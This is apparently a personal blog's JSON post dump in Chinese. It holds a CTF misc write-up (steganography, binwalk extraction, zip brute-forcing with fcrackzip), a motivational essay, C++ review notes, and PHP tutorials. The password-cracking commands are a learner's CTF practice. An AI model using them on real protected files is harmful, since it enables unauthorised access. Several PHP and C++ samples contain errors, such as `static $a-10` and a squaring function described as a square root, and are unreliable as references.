下载好附件得到一个 格式为gif 的动图 从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。 分成了89张图片，然后我们一张一张的看就得到了；得到了flag{he11ohongke} 是11不是ll 哈哈有坑 0×02 二维码 下载得到附件是一张二维码扫一下得到 secret is here 我天真的以为flag，果然交了就不对 就没了思路，看了大佬博客，于是乎就用binwalk扫了一下里面有一个zip文件分离出来 binwalk QR_code.png -e 得到兴奋了一会但是需要密码；接着上装备fcrackzip来暴力破解了` fcrackzip -b -c1 -l4 -u 1D7.zip `密码=7639 把CTF 换成flag就欧克了！！！ 0×03 N种方法解决 下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下一张经过base64加密的图片！在线找个解密网站，解密得到扫一下，得到flag！ 0×04 大白 下载好是一张图片很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！ 0×05 Misc 基础破解 下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！ 使用暴力破解，得到密码2563，然后得到一串字符ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30= base64解密得到flag！ 0×06 Misc 你竟然赶我走 下载是一张图片感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。 0×07 Misc 乌镇峰会种图题目说了一大堆，拉进winhex一看和上题一样。 xswl 0×08 LSB附件：隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。红绿蓝的0通道最上面都被遮住了，应该会有一些东西。用data extract 钩住红绿蓝的0通道。保存为png的图片，会得到一张二维码，扫一下的到flag。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Misc学习","slug":"Misc学习","permalink":"https://qidian-png.github.io/tags/Misc%E5%AD%A6%E4%B9%A0/"}]},{"title":"鸡汤","slug":"鸡汤  ——致君","date":"2020-06-03T09:05:05.000Z","updated":"2020-06-03T09:12:04.661Z","comments":true,"path":"2020/06/03/鸡汤  ——致君/","link":"","permalink":"https://qidian-png.github.io/2020/06/03/%E9%B8%A1%E6%B1%A4%20%20%E2%80%94%E2%80%94%E8%87%B4%E5%90%9B/","excerpt":"","text":"## 星辰和大海都需要门票，诗和远方的路费也都很贵。 星辰大海需要门票， 诗和远方路费很贵。 就像我们不努力的话， 情怀都养不起。 大海星辰皆不得， 梦想远方不可及。 人生有时候很苦逼， 如果不努力， 你拥有的一切， 都有可能失去； 即使努力了， 也会有很多东西得不到。 世间万物皆有属， 有付出才有可能收获。 世界上所有的美好都是给配得上的人， 所有的东西，都是很贵， 所以，我们有的时候只能努力。 因为所谓的大海星辰， 都是要靠我们自己来得到。 诗和远方都是我们所追求的， 但是，所谓的追求，只不过是我们的努力罢了。 我们总要追求我们的未来， 所以，我们现在一定要努力， 尽力配得上我们的情怀。","categories":[{"name":"生活","slug":"生活","permalink":"https://qidian-png.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"琐事","slug":"琐事","permalink":"https://qidian-png.github.io/tags/%E7%90%90%E4%BA%8B/"}]},{"title":"C++复习--函数的模板和重载","slug":"C++复习——函数模板和函数的重载","date":"2020-05-20T07:04:05.000Z","updated":"2020-07-31T13:03:44.920Z","comments":true,"path":"2020/05/20/C++复习——函数模板和函数的重载/","link":"","permalink":"https://qidian-png.github.io/2020/05/20/C++%E5%A4%8D%E4%B9%A0%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E6%A8%A1%E6%9D%BF%E5%92%8C%E5%87%BD%E6%95%B0%E7%9A%84%E9%87%8D%E8%BD%BD/","excerpt":"","text":"前言：慢慢复习路！！！ 目录：0×01：函数的重载0×02：函数的模板0×03：有默认参数的函数0×04：变量的引用0×05：将引用作为函数参数0×06：内置函数0×07：作用域运算符0×08：字符串变量0×09：动态分配/撤销内存的运算符new和delete 0×01：函数的重载 定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。 例一： 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int max(int a,int b,int c) &#x2F;&#x2F;求3个整数中的最大者&#123; if (b&gt;a) a&#x3D;b;if (c&gt;a) a&#x3D;c;return a; &#125; float max(float a,float b, float c) &#x2F;&#x2F;求3个实数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a; &#125; long max(long a,long b,long c) &#x2F;&#x2F;求3个长整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; 例二： 12345678910111213141516int main( )&#123;int a,b,c; float d,e,f; long g,h,i;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; cin&gt;&gt;d&gt;&gt;e&gt;&gt;f;cin&gt;&gt;g&gt;&gt;h&gt;&gt;i;int m;m&#x3D; max(a,b,c); &#x2F;&#x2F;函数值为整型cout &lt;&lt;&quot;max_i&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;float n;n&#x3D;max(d,e,f); &#x2F;&#x2F;函数值为实型cout&lt;&lt;&quot;max_f&#x3D;&quot;&lt;&lt;n&lt;&lt;endl;long int p;p&#x3D;max(g,h,i); &#x2F;&#x2F;函数值为长整型cout&lt;&lt;&quot;max_l&#x3D;&quot;&lt;&lt;p&lt;&lt;endl;return 0;&#125; 例三： 123456789下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。#include &lt;iostream&gt;using namespace std;int max(int a,int b,int c) &#x2F;&#x2F;求3个整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; 注意：不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。 0×02：函数的模板 定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb) 格式： template typename 标识符[, typename 标识符, … … ] 函数定义（函数的类型和参数的类型用声明的标识符表示）template 是关键字，含义是模板 typename 是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。 所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。 例1 为计算两个数中的大数定义函数模板 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;T max(T a,T b,T c) &#x2F;&#x2F;用虚拟类型T表示类型&#123;if(b&gt;a) a&#x3D;b; if(c&gt;a) a&#x3D;c; return a;&#125;int main()&#123;int i1&#x3D;8,i2&#x3D;5,i3&#x3D;6,i; double d1&#x3D;56.9,d2&#x3D;90.765,d3&#x3D;43.1,d; long g1&#x3D;67843,g2&#x3D;-456,g3&#x3D;78123,g; i&#x3D;max(i1,i2,i3); d&#x3D;max(d1,d2,d3); g&#x3D;max(g1,g2,g3); cout&lt;&lt;&quot;i_max&#x3D;&quot;&lt;&lt;i&lt;&lt;endl; cout&lt;&lt;&quot;d_max&#x3D;&quot;&lt;&lt;d&lt;&lt;endl;cout&lt;&lt;&quot;g_max&#x3D;&quot;&lt;&lt;g&lt;&lt;endl; return 0;&#125; 注意：从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。0×03：有默认参数的函数 C++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。 格式： 形参类型 形参变量名 = 常数 功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。 注意：有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。 字面意思不好理解，例子奉上。 1234567编写计算圆柱体体积函数 float volume ( float h, float r &#x3D; 12.5) 调用可以采用以下任何一种形式： volume( 45.6); volume( 32.5, 10.5); 函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。 注意：一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。 二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。 0×04：变量的引用 C++提供了为变量取别名的功能，这就是变量的引用。格式： 类型 &amp;变量1 = 变量2变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。注意：两个变量不能用同一个别名。 12345678例：int a &#x3D; 3 ,b &#x3D;4; int &amp;c &#x3D; a; &#x2F;&#x2F; c是a 的别名 int &amp;c &#x3D; b; &#x2F;&#x2F; 错误的用法 一个变量可以有多个别名 例：int a &#x3D; 3; int &amp; b&#x3D; a; int &amp; c&#x3D; b; 变量a 有两个别名b和c。 又来 1234567891011#include &lt;iostream&gt;using namespace std;int main( )&#123;int a&#x3D;10; int &amp;b&#x3D;a; &#x2F;&#x2F;声明b是a的引用 a&#x3D;a*a; &#x2F;&#x2F;a的值变化了，b的值也应一起变化 cout&lt;&lt;a&lt;&lt;&quot; &quot;&lt;&lt;b&lt;&lt;endl; b&#x3D;b&#x2F;5; &#x2F;&#x2F;b的值变化了，a的值也应一起变化 cout&lt;&lt;b&lt;&lt;&quot; &quot;&lt;&lt;a&lt;&lt;endl; return 0;&#125; 0×05：将引用作为函数参数 C++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。 （1）用普通变量做形参 这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。 123456789101112131415例：无法实现两个变量的值互换的程序#include &lt;iostream&gt;using namespace std;void swap(int a,int b)&#123; int temp; temp&#x3D;a; a&#x3D;b; b&#x3D;temp; &#x2F;&#x2F; 实现a和b的值互换&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(i,j); cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl; &#x2F;&#x2F; i和j的值未互换 return 0;&#125; （2）用指针变量做形参 C语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。 例1.11用指针变量做形参，实现两个变量值的交换。 1234567891011121314#include &lt;iostream&gt;using namespace std;void swap(int *p1,int *p2)&#123;int temp; temp&#x3D;*p1; *p1&#x3D; *p2; *p2&#x3D;temp;&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(&amp;i,&amp;j); cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl; return 0;&#125; 3）用引用变量做形参 用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。 123456789101112131415例：利用引用变量实现两个变量值的交换#include &lt;iostream&gt;using namespace std;void swap(int &amp;a,int &amp;b)&#123;int temp; temp&#x3D;a; a&#x3D;b; b&#x3D;temp;&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(i,j); cout&lt;&lt;&quot;i&#x3D;&quot;&lt;&lt;i&lt;&lt;&quot; &quot;&lt;&lt;&quot;j&#x3D;&quot;&lt;&lt;j&lt;&lt;endl; return 0;&#125; 对引用的进一步说明（1）引用变量都具有非void类型（2）不能建立引用的数组（3）可以建立常引用变量，不允许修改常引用变量的值例： int i ; const int &amp;a = i; a = 3; // 错误的用法 i = 8; // i 不是常变量，可以修改 （4）可以建立指针变量的引用变量例：int i; int *p = &amp; i; int * &amp;pt = p; // pt是p的别名变量，同时 // 也是指针变量 0×06：内置函数 C++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。 格式： inline 函数类型 函数名(形参表) { 函数体 } inline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中 调用格式： 函数名（实参表） 12345678910111213141516例：计算三个整数中的大数#include &lt;iostream&gt;using namespace std;inline int max(int a,int b,int c) &#x2F;&#x2F; 这是一个内置函数， &#x2F;&#x2F; 求3个整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; int main( )&#123;int i&#x3D;7,j&#x3D;10,k&#x3D;25,m; m&#x3D;max(i,j,k); cout&lt;&lt;&quot;max&#x3D;&quot;&lt;&lt;m&lt;&lt;endl; return 0;&#125; 由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成： { a=i ; b = j ; c= k; if ( b&gt;a) a=b; if ( c&gt;a) a=c; m=a; } 1234567891011例:用内置函数计算平方根#include &lt;iostream&gt;using namespace std;inline int power(int x) &#x2F;&#x2F;定义内置函数&#123;return x*x;&#125;int main()&#123;cout&lt;&lt;power(2)&lt;&lt;endl; cout&lt;&lt;power(1+1)&lt;&lt;endl; return 0;&#125; 编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成： { cout&lt;&lt;22&lt;&lt;endl; cout&lt;&lt;22&lt;&lt;endl; } 运行结果是 4 4 优缺点：使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。 0×07：作用域运算符直接看例子： 12345678局部变量和全局变量同名 #include &lt;iostream&gt; using namespace std; float a&#x3D;13.5; int main( ) &#123; int a&#x3D;5; cout&lt;&lt;a&lt;&lt;endl; return 0; &#125; 程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成 123456789#include &lt;iostream&gt; using namespace std; float a&#x3D;13.5; int main( ) &#123;int a&#x3D;5; cout&lt;&lt;a&lt;&lt;endl; cout&lt;&lt;::a&lt;&lt;endl; return 0; &#125; ::a表示全局变量a。注意不能用::访问局部变量。 0×08：字符串变量 C++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。 1.定义字符串变量 格式： string 变量名表; 可以在定义变量时用字符串常量为变量赋初值： string 变量名 = 字符串常量 注意：如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。 2.对字符串操作① 对字符串变量赋值 字符串变量= 字符串表达式例： string st1,st2; st1 = “王点点“; st2 = st1; ② 访问字符串中的字符C++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。例：string w = “ then”; w[2] = ‘e’;结果字符串w变成 than ③输入输出字符串格式：cin &gt;&gt; 字符串变量 cout &lt;&lt; 字符串变量 ④字符串连接运算格式：字符串1 + 字符串2功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。例：string st1=“C++”; string st2=“Language”; st1 = st1 + st2 ;结果是 C++Language ⑤字符串的比较运算 可以用关系运算符&gt;、&gt;=、==、!=、&lt;、&lt;=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。 例：”china” &gt; “chinese” 运算结果是假。 0×09：动态分配/撤销内存的运算符new和delete 分配内存运算new 类型 [ （初值）]类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。 12345例：int *a &#x3D;new int ; int *b &#x3D;new int( 100); char *ch &#x3D; new char[10]; int * q &#x3D; new int [5][4]; float * p &#x3D; new float(3.14159); 归还动态内存运算delete[] 指针变量[] 代表数组，如果不是数组可以省略[]。运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。 123例：char *p&#x3D;new char[10]; … … delete [ ] p; 12345678910111213141516171819例1.18用动态内存存放结构体变量#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;struct student &#123;char name [10]; int num; char sex;&#125;;int main ( )&#123;student *p; p&#x3D;new student; strcpy(p-&gt;name,&quot;Wang Fun&quot;); p-&gt;num&#x3D;10123; p-&gt;sex&#x3D;&#39;M&#39;; cout&lt;&lt;p-&gt;name&lt;&lt;&quot; &quot;&lt;&lt;p-&gt;num&lt;&lt;&quot; &quot;&lt;&lt;p-&gt;sex&lt;&lt;endl; delete p; return 0;&#125; 先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。 明天继续复习！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c++学习","slug":"c-学习","permalink":"https://qidian-png.github.io/tags/c-%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--函数（五）","slug":"php学习--函数（五）","date":"2020-05-15T07:04:05.000Z","updated":"2020-07-31T13:01:51.051Z","comments":true,"path":"2020/05/15/php学习--函数（五）/","link":"","permalink":"https://qidian-png.github.io/2020/05/15/php%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0%EF%BC%88%E4%BA%94%EF%BC%89/","excerpt":"","text":"目录： 0×01：自定义函数 0×02：变量范围 0×03：参数传递，可变函数 0×04：递归函数 0×01：自定义函数 ①函数定义 定义：function 函数（参数1，参数2，…..，参数N）{ 函数体； //任意有效PHP代码 return 表达式； //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束} ②函数的调用注意：无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。 ③函数的参数形式参数由零个，一个或者多个变量组成。实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。④函数的返回值函数的返回值是将函数执行的结果返回给函数的调用者如果不写返回，则默认返回值为NULL 0×02：变量范围 ①局部变量也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。 123function test()&#123;$a&#x3D;1&#125; 这个a就是局部变量②全局变量也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。全局变量要使用需要使用global定义。 ③静态变量 在函数内部定义变量的时候使用static来定义变量。特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。 1234567function test（）&#123;static $a-10;echo ++$a;&#125;test();echo &lt;br &#x2F;&gt;;test(); 两次输出的值为11，12. 0×03：参数传递，可变函数 ①按值传递参数我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。 ②按引用传递参数相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！ ③函数的默认参数可以给形式参数设置默认值，直接赋值即可。赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。 ④可变长度参数列表 123func_get_args() &#x2F;&#x2F;获取参数的类型，信息func_get_arg() &#x2F;&#x2F;调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息func_num_args() &#x2F;&#x2F;返回传入参数的类型，个数 在函数内部使用，返回给我们一些参数信息。 ⑤可变函数 12345function test（）&#123;echo &#39;我是菜鸟&#39;&#125;$a&#x3D;test(); &#x2F;&#x2F;把函数的名字加上引号赋给变量即可$a() &#x2F;&#x2F;test() 0×04：递归函数 递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。 12345678910111213&lt;?php function test($n)&#123; echo $n . &quot; &quot;; if ($n &gt; 0) &#123; test($n - 1); &#125; else &#123; echo &quot;&lt;--&gt;&quot;; &#125; echo $n . &quot; &quot;; &#125; test(10);?&gt; 函数输出的结果： 10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来） 执行test(10)，echo 10，然后因为10&gt;0，执行test(9)，后面还有没来得及执行的echo 10所以先留来一个10，到第二步时执行test(9) ，echo 9,9&gt;0 ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1……………最后执行到0时，输出 10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。 从内而外输出1，2，3，4，5，6，7，8，9，10，最后的输出结果10 9 8 7 6 5 4 3 2 1 0 &lt;--&gt; 0 1 2 3 4 5 6 7 8 9 10递归函数就结束了。 0×05：内部（内置）函数 php提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明) 开启一些扩展模块","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--各种语句（四）","slug":"php学习--各种语句（四）","date":"2020-05-10T07:04:05.000Z","updated":"2020-05-20T15:39:00.615Z","comments":true,"path":"2020/05/10/php学习--各种语句（四）/","link":"","permalink":"https://qidian-png.github.io/2020/05/10/php%E5%AD%A6%E4%B9%A0--%E5%90%84%E7%A7%8D%E8%AF%AD%E5%8F%A5%EF%BC%88%E5%9B%9B%EF%BC%89/","excerpt":"","text":"目录：0×01: if语句0×02：switch 语句0×03：循环语句0×04：特殊的控制语句 0×01:if语句 ① if(表达式) 语句(代码块)； 如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。 123456$a&#x3D;18;$b&#x3D;15;if($b&gt;&#x3D;$a) &#123;echo &quot;你已经成年！&quot;&#125;echo &quot;你还未成年！&quot; ②if…..else..语句 1234if(语句)&#123; 1 &#125;else&#123; 2 &#125; &#x2F;&#x2F;如果语句为true，则执行1，为false则执行2。 ③ifelse ifelse ifelse 语句 12345678if（语句1）&#123; 结果1&#125;else if（语句2）&#123; 结果2 &#125;else if（语句3）&#123;结果3&#125; &#x2F;&#x2F;首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。else &#123;结果4&#125; 0×02：switch 语句 12345678910111213141516switch（表达式）&#123; case 值1： 结果1； break； case 值2： 结果2； break； case 值3： 结果3； break； default： 语句N； &#125; 注意：表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。 0×03：循环语句 ①while语句 123while（表达式）&#123;各种语句&#125; 当表达式的值为true，执行各种语句，直到表达式的值为false。 ②do….while 语句 123do&#123;各种语句&#125; while（表达式）；&#x2F;&#x2F;先执行各种语句，再判断表达式的真假。 注意：while（）与do()...while的区别在于do ...while语句至少会被执行一次。 ③for语句 12for（语句1；语句2；语句3）&#123;各种语句&#125; 语句1：多为初始化的语句，$a=0;语句2：多为判断是否为真值。语句3：变量自增，自减的语句。注意：无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开。 0×04：特殊的控制语句 ①break语句 用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。 ②continue语句只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。 ③exit（）函数结束当前整个程序的执行，并退出。die()函数和其一样。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--运算符（三）","slug":"php学习--运算符（三）","date":"2020-05-06T07:04:05.000Z","updated":"2020-05-11T09:08:47.043Z","comments":true,"path":"2020/05/06/php学习--运算符（三）/","link":"","permalink":"https://qidian-png.github.io/2020/05/06/php%E5%AD%A6%E4%B9%A0--%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！ 目录： 0×01：算数运算符 ① + 就是1+1=2； 1234$a&#x3D;1;$b&#x3D;2;$c&#x3D;$a+$b;echo $c; ② ➖ 1.单纯的减号 1234$a&#x3D;10;$b&#x3D;2;$c&#x3D;$a-$b;echo $c; 2.取反 12345$a&#x3D;1;$b&#x3D;-$a;echo $b; &#x2F;&#x2F;-1echo &lt;br &#x2F;&gt;;echo $a; &#x2F;&#x2F;1 ③ * 乘号 1234$a&#x3D;3;$b&#x3D;4;$c&#x3D;$a*$b;echo $c; 就是简单的乘号。 ④ / 除号 1234$a&#x3D;10;$b&#x3D;2;$c&#x3D;$a&#x2F;$b;echo $c; ⑤ – ，++运算 12++$a; --$a ; 就是先自增或者自减，让后$a参与运算。 12$a--;$a++; 就是先让$a参与运算，让后进行自增或者自减。 注意： 123$a&#x3D;10; ++$a; echo $a; 这种情况 ++$a与$a++都没有参与数值运算，情况相同，数值相同。 0×02：字符串运算符 PHP中的字符串运算符只有一个.,也成为连接运算符。 0×03：赋值运算符 1&#x3D;，+&#x3D;，*&#x3D;，-&#x3D;，&#x2F;&#x3D;，%&#x3D;，.&#x3D; 等等 二元运算符：左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。 ①=：即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。② 123456+&#x3D;：$a+&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a+$b;-&#x3D;:$a-&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a-$b;*&#x3D;:$a*&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$A*$b;&#x2F;&#x3D;:$a&#x2F;&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$S&#x2F;$b;%&#x3D;:$a%&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a%$b; 取余.&#x3D;:$a&#x3D;$b; &#x2F;&#x2F;$a&#x3D;$a.$b 0×04：比较运算符 1&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;，!&#x3D;, &lt;&gt; , !&#x3D;&#x3D; , &lt; , &gt; , &lt;&#x3D; , &gt;&#x3D;等等 概念：对操作数进行比较，满足条件即为true，否则为false。 PHP规定： 使用echo输出布尔类型值的时候； echo true ; 显示结果为1 echo false; 显示为空白如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！ ①== （值相等） 12$a&#x3D;&#x3D;$b;var_dump（$a&#x3D;&#x3D;$b） 值相等为true，不相等为false。 ②=== (值相等，类型也要相等) 12345$a&#x3D;11;$b&#x3D;&#39;11&#39;;var_dump($a&#x3D;&#x3D;$b); &#x2F;&#x2F;trueecho &lt;br &#x2F;&gt;;var_dump($a&#x3D;&#x3D;&#x3D;$b); &#x2F;&#x2F;false ③!= ,&lt;&gt;(值不相等) 123$a&#x3D;1;$b&#x3D;2;var_dump($a!&#x3D;$b); &#x2F;&#x2F;true ④ !== (不全等)值或类型有一个相等的就可以。 ⑤&lt; , &gt; , &lt; = , &gt;= ;这个就是和数学里的一样，没必要细说。 0×05：逻辑运算符概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。以下值被认为false，其他的值都是被认为true。布尔值false0浮点型0.0空白字符串和字符串0没有成员的数组NULL ①and &amp;&amp; (逻辑与)只有两边同时为true时，最后的结果才为true。 ②or || (逻辑或)两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。 ③xor (逻辑异或)左右两边的值不一样是结果为true，一样时为false。 ④ ！ 逻辑非将原表达式的值否定掉，true变成false，false变成true。 0×06：位运算符 位运算符用于对操作数中的每一个二进制位进行运算。 0×07;其他运算符 ①？ ：三元运算符表达式1 ？ 表达式2 ：表达式3；如果表达式1的值为true，则执行表达式2，否则执行表达式3。 ②’ ‘可以把系统的命令放在里面执行！（Windows系统） ③@屏蔽表达式可能发生的错误！注意：是表达式 echo @$b; ④=&gt; , -&gt; ,instanceof(先省略) 0×08：运算符的优先级①【无】递增递减②【右-&gt;左】逻辑非③【左-&gt;右】乘，除，取余④【左】加，减，字符串连接⑤【无】包含大于号，小于号的运算符⑥【无】不包含大于号或者小于号的运算符⑦【左】逻辑与 &amp;&amp;⑧【左】逻辑或 ||⑨【左】？ ：⑩【右】赋值运算符⒒【左】逻辑异或 xor 圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。 短路问题： 1234$a&#x3D;false;$b&#x3D;1;$a &amp;&amp; ++$b;echo $b; &#x2F;&#x2F;上面的$b直接被短路掉！并且数值不变！ 语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--常量（二）","slug":"php学习--常量（二）","date":"2020-05-05T07:04:05.000Z","updated":"2020-05-11T09:04:29.242Z","comments":true,"path":"2020/05/05/php学习--常量（二）/","link":"","permalink":"https://qidian-png.github.io/2020/05/05/php%E5%AD%A6%E4%B9%A0--%E5%B8%B8%E9%87%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"# 常量 1、概念： 常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。 2、定义和使用： define（’常量名称’，常量值） 或者 